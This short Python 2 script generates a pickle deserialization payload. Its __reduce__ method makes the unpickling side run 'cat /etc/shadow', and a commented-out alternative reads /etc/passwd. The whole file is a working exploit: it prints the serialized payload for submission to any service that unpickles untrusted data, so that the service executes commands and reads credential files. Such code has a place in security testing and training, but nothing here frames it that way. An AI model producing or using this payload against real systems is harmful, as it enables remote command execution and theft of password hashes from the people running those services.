#!/usr/bin/env python2

import cPickle
import sys, os, subprocess

class SerializedPickleOSCommand(object):
    def __reduce__(self):
#        return (subprocess.check_output, (['cat', '/etc/passwd'],))
        return (subprocess.check_output, (['cat', '/etc/shadow'],))

print(cPickle.dumps(SerializedPickleOSCommand()))
